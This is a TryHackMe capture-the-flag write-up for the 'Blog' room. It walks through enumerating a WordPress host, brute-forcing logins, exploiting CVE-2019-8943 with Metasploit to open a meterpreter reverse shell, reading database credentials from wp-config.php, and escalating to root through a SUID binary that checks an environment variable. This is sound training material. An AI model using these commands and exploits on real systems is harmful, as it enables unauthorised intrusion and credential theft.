#  Blog.THM


## First lets add the box ip to our /etc/hosts
 ```
 $sudo nano /etc/hosts
 
 # Host addresses
 127.0.0.1  localhost
 127.0.1.1  parrot
 10.10.173.247  blog.thm

 ::1        localhost ip6-localhost ip6-loopback
 ff02::1    ip6-allnodes
 ff02::2    ip6-allrouters
 
 ```
 
 Perfect we can get started.


## Enumurate the box to find possible attack vectors.

## Check out scan results in order to start covering ground.

### All Scans

```
1.Nmap Scan

NmapScanStandardPorts
    
    Scan Used: nmap -v -A -T4 -sC -sV -o 10.10.47.63-Scan 10.10.47.63
    
    Port 22 (SSH) open. Version:  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    Port 80 (Http WebServer). Version:  Apache httpd 2.4.29 ((Ubuntu))
    Port 139 (SMB) netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)    
    Port 445 (SMB) netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
    
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
    |   Computer name: blog
    |   NetBIOS computer name: BLOG\x00
    |   Domain name: \x00
    |   FQDN: blog
    |_  System time: 2021-02-12T00:50:35+00:00
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2021-02-12T00:50:35
    |_  start_date: N/A    
```

 I started here since we can already see some services running that intrest us or that you want to keep your eye out for. SSH is open but we'll look at that later if prolly for privelage escalation if we get some RSA Private Keys etc. We see a http webserver is running which is how we going to maybe get access to the machine itself (wordpress is always a good attack vector). And then the last two ports are SMB which prompts us to run a couple more scans to see if we get anything of intrest from these services.

```

2. WP-Scan

wpscan --url 10.10.65.111 --enumerate u


robots.txt found: http://10.10.47.63/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php

```
Im gonna pause here saying that its always in good habit to check out the robots.txt file even if doesn't come up on any scan you do using any tool its in good practice. Anyways, we get some rabit holes (Im pretty sure I may be dumb), but I don't think they'd make it that easy so I carried on on my scan (btw Im just highlighting the important scan details, If you feel the need to see the full scan do it yourself its always good practice to get the switches for your enumuration tools memorized so your not stumbling everywhere)

```
[+] XML-RPC seems to be enabled: http://10.10.47.63/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
 
 ```
 The metasploit modules that the scan detected are good refrences if you get stuck on this machine. Its always good to always have stuff to look back on if your stuck instead of getting drained and quiting.
 ```

[+] WordPress readme found: http://10.10.47.63/readme.html

```
Directory found I'll check that out. Seems to be a information on setting up the wordpress blog itself. Intresting. 
```

[+] Upload directory has listing enabled: http://10.10.47.63/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
```
Another pause we see an uploads diretory for wp-content this might be usefull for setting up a reverse shell or it might be a bust who knows, we'll keep going anyways down the scan.

```

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
```
Lets go we got a version number and a release date. This is awesome because now we know what vulnerabilities to look into. Epic.

```

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.47.63/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.47.63/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Aggressive Detection)
```

Username enumeration is great too now we know what usernames to bruteforce and possibely get access into this word press blog. Im gonna actually do that before analyzing anymore of my scans.


### Word Press Brute-Force Break

You cooooould bruteforce with Hydra but i don't feel like grabbing a post request so Im just going to use wpscan. If you wanted to, TryHackMe wants you to grab the post request using burpsuite, but you can also do it with chrom dev tools (inspect element for you actual hackers). 

```
wpscan --url http://blog.thm/wp-login.php/ --usernames bjoe1 --passwords /usr/share/wordlists/rockyou.txt 
```
Keep in mind you don't have to put the full directory to the login page I just do it because Im superstitious. 

```
wpscan --url http://blog.thm/wp-login.php/ --usernames kwheel1 --passwords /usr/share/wordlists/rockyou.txt 
```
I ran into a roadblock with the first user so I switched to kwheel1 and we cracked the password using the all too familiar rockyou.txt. I got my crack at around 2865 so if your going to use rock you too it should be fairly quick. 

```

Trying kwheel / cutiepie1 Time: 00:03:44 <> (2864 / 14347257)  0.01%  ETA:Trying kwheel / westham Time: 00:03:44 <> (2864 / 14347257)  0.01%  ETA: ?Trying kwheel / westham Time: 00:03:44 <> (2865 / 14347257)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
| Username: kwheel, Password: c[REDACTED]


```

Now that we have Entry into the wordpress site Im gonna levy the information the other scans I had running in the background to see if we learn anything useful.


3. Nikto-Scan

```
+ Uncommon header 'link' found, with contents: <http://blog.thm/wp-json/>; rel="https://api.w.org/"
```

Free Directory enumuration is always good.



4. Enum4Linux-Scan

```
======================================= 
|    Share Enumeration on 10.10.47.63    |
 ======================================== 

    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    BillySMB        Disk      Billy's local SMB Share
    IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

//10.10.47.63/BillySMB    Mapping: OK, Listing: OK

```
We've discovered a user share BillySMB we can smbclient into. I wouldn't get stuck here since its a RabitHole but its always in good practice to check it out and see if theres anything useful :)

```
===================================================================== 
|    Users on 10.10.47.63 via RID cycling (RIDS: 500-550,1000-1050)    |
 ====================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3132497411-2525593288-1635041108
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\bjoel (Local User)
S-1-22-1-1001 Unix User\smb (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

```

More Shares to look into I'll check back on these later to see if we need to grab anything from them for privelage escalation purposes.

5. Gobuster-Scan
```
$gobuster dir -u http://10.10.65.111/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30 -q -s 200,204,301,302,307


/login (Status: 302)
/rss (Status: 301)
/index.php (Status: 301)
/0 (Status: 301)
/feed (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 302)
/wp-login.php (Status: 200)
/rss2 (Status: 301)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/wp-register.php (Status: 301)
/wp-rss2.php (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme.html (Status: 200)
/robots.txt (Status: 200)
/' (Status: 301)
/0000 (Status: 301)
/wp-atom.php (Status: 301)
/embed (Status: 301)
/wp-commentsrss2.php (Status: 301)
/wp-rdf.php (Status: 301)
/wp-rss.php (Status: 301)


```

Heres all the directories I've grabbed using gobuster I used a filter to only show status codes 200,204,301,302,307,401,403 so that I don't drown in error messages which is usually the case. Theres a lot of directories we've managed to uncover nothing were gonna visit right now though, but we will check them out come privesc if we need them. 

You may be wondering why don't I go to these directories. Its because the room has a good deal of rabbit holes that I'm trying to avoid by doing things out of nescessity always good practice if you have trickster rooms like that (whoever put that mp4 file in that samba share had me looking for stegnography clues for a solid 30min before I gave up).

## Exploitation

Given the abundance of Wordpress exploits I thought to do a google search to see if anything pops up. After further research I found a lot of promising vulnerabilties keep in mind 2020 and 2021 have introduced a significant amount of new wordpress exploits so much so that after doing a wpscan with api there is 32 exploits that it found that could work on this specific box. I decided to keep it simple and use the CVE they highlighted CVE-2019-8943.

Thankfully theres a metasploit module associated with the exploit making our lives that much easier .

```
$msfconsole
$search WordPress
$use exploit/multi/http/wp_crop_rce                                 2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload

```

```
sf6 exploit(multi/http/wp_crop_rce) > show options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  YOUROPENVPN$IP(tun0) yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
PASSWORD => cutiepie1
msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS 10.10.173.247
RHOSTS => 10.10.173.247
msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf6 exploit(multi/http/wp_crop_rce) > run

```
So we got the exploit set up what it does is it "allows Path Traversal in wp_crop_image(). An attacker (who has privileges to crop an image) can write the output image to an arbitrary directory via a filename containing two image extensions and ../ sequences, such as a filename ending with the .jpg?/../../file.jpg substring." According to nvd.nistgov (National Vulnerability Database)
```

[*] Started reverse TCP handler on 10.2.49.167:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39282 bytes) to 10.10.173.247
[*] Meterpreter session 1 opened (10.2.49.167:4444 -> 10.10.173.247:44196) at 2021-02-12 06:14:17 +0000
[*] Attempting to clean up files...
 
meterpreter > 
```
This is how it should look a debug that I had to gothrough is that I forgot to set my local host to my openvpn $IP so it never sent stage it only attempted to clean up files because It never got recieved the reverse TCP connection.

Anyways.

```
ls
Listing: /var/www/wordpress
===========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100640/rw-r-----  235    fil   2020-05-28 13:15:42 +0100  .htaccess
100640/rw-r-----  235    fil   2020-05-28 04:44:26 +0100  .htaccess_backup
100640/rw-r-----  418    fil   2013-09-25 01:18:11 +0100  index.php
100644/rw-r--r--  1110   fil   2021-02-12 06:16:26 +0000  kTmlEUvCzC.php
100640/rw-r-----  19935  fil   2020-05-26 16:39:37 +0100  license.txt
100640/rw-r-----  7415   fil   2020-05-26 16:39:37 +0100  readme.html
100644/rw-r--r--  1110   fil   2021-02-12 06:19:57 +0000  uYrpHsbwYN.php
100640/rw-r-----  5458   fil   2020-05-26 16:39:37 +0100  wp-activate.php
40750/rwxr-x---   4096   dir   2018-12-06 18:00:07 +0000  wp-admin
100640/rw-r-----  364    fil   2015-12-19 11:20:28 +0000  wp-blog-header.php
100640/rw-r-----  1889   fil   2018-05-02 23:11:25 +0100  wp-comments-post.php
100640/rw-r-----  2853   fil   2015-12-16 09:58:26 +0000  wp-config-sample.php
100640/rw-r-----  3279   fil   2020-05-28 04:49:17 +0100  wp-config.php
40750/rwxr-x---   4096   dir   2020-05-26 04:52:32 +0100  wp-content
100640/rw-r-----  3669   fil   2017-08-20 05:37:45 +0100  wp-cron.php
40750/rwxr-x---   12288  dir   2018-12-06 18:00:08 +0000  wp-includes
100640/rw-r-----  2422   fil   2016-11-21 02:46:30 +0000  wp-links-opml.php
100640/rw-r-----  3306   fil   2017-08-22 12:52:48 +0100  wp-load.php
100640/rw-r-----  37286  fil   2020-05-26 16:39:37 +0100  wp-login.php
100640/rw-r-----  8048   fil   2017-01-11 05:13:43 +0000  wp-mail.php
100640/rw-r-----  17421  fil   2018-10-23 08:04:39 +0100  wp-settings.php
100640/rw-r-----  30091  fil   2018-04-30 00:10:26 +0100  wp-signup.php
100640/rw-r-----  4620   fil   2017-10-23 23:12:51 +0100  wp-trackback.php
100640/rw-r-----  3065   fil   2016-08-31 17:31:29 +0100  xmlrpc.php
100644/rw-r--r--  1112   fil   2021-02-12 06:22:35 +0000  yUoHCQYKbL.php
```
It looks like we have full access to the wordpress file directory and from here we can view the config file for easy password grabbing since its stored in cleartext and not hashed.
```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'blog');

/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'L[REDACTED]');

```
NO wonder I wasn't able to crack Joels password. We know its joels because I logged into the wordpress blog using this password and his username that we enumurated from wpscan. 

```
meterpreter > shell
Process 17405 created.
Channel 1 created.
python -c "import pty; pty.spawn('/bin/bash')"

{{{{{{{{{SWITCH BACK TO YOUR MACHINE}}}}}}}}}}}

www-data@blog:/var/www/wordpress$ export TERM=xtrm 
export TERM=xtrm 
www-data@blog:/var/www/wordpress$ 


------------------------------
My Machine's terminal
stty raw -echo
```
Instead of the meterpreter I opted for a zsh shell since I can use more system commands than on a meterpretr shell (dont get me wrong their great and you should always strive for a metrpreter shell but in this case I didn't feel using it.
```

find / -perm -4000 -type f 2>/dev/null
```
This command will help us find manuplitable SUID one of the easiest ways to obtain root apart from misconfigured privlages

I was admitadly having some trouble spotting anything out of the ordinary so I just booted up linpeas from my merterpreted to see if it could spot any mishaps
```
cd /tmp/
upload linpeas.sh 
shell
chmod 755 linpeas.sh
./linpeas.sh
```

Finally getting my linpeas setup we see that linpeas has found a bin on thats odd. Its called checker and its run as root. 

Its a shared library so we have to get our reversing tools out. Ghidra, Cutter, R2, and even terminal reversing are an option. Im going to use Cutter though since the UI is clean.

```

undefined8 main(void)
{
    int64_t iVar1;
    uint32_t var_1h;
    
    iVar1 = getenv(0x7f4);
    if (iVar1 == 0) {
        puts(0x804);
    } else {
        setuid(0);
        system(0x7fa);
    }
    return 0;
}


```

Here we have the decompiled main function. Going back I should have fixed the function signature of main but its fine I got the general jist of this program. We can see theres an else clause that sets our UID to 0 which is what we want because that means this program (for some reason) has capability to make us root. 

Further looking at the binary shows a string called admin and not and admin.  Which means that my initial guess was right.

The program is getting my enviorment variable to see if I am root or not. 

from here we can just 

```
$export admin=admin
$/usr/sbin/checker
$whoami
root

```
The rest is pretty straight forward find the user.txt file that may or may not be in a certain media directory and go to root home and find root flag.







